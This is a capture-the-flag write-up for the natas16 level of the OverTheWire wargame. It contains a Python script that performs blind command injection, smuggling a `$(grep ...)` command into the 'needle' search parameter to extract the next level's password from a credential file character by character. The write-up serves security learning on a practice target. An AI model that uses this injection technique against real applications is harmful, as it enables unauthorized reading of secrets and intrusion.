# natas16

Here it is similar to natas10, but more characters are restricted. If you try anything normal, it won't work. Well one more trick up our sleeves it, like natas15, check if each character comes in natas17's password or not, using `grep`. This will work since if the char is not, then it will output the dictionary list, else it will output nothing. And we are looking for the case nothing is outputted. 
<br>
This is again a brute force. This is called BLIND COMMAND INJECTION. The code which will work is-

```python
import requests
import string

url = 'http://natas16.natas.labs.overthewire.org/'
auth = ('natas16', '<password>')  # replace <password> with the actual password
characters = string.ascii_letters + string.digits
known_password = ''

session = requests.Session()
session.auth = auth

for _ in range(32):  # assuming the password is 32 characters long
	for char in characters:
		command = f'$(grep ^{known_password}{char} /etc/natas_webpass/natas17)'
		response = session.get(url, params={'needle': command}) 
		if 'April' not in response.text:  # 'April' is a word that appears in the normal output
			known_password += char
			print(known_password)
			break

print(known_password)
```
This will output the password and we are done!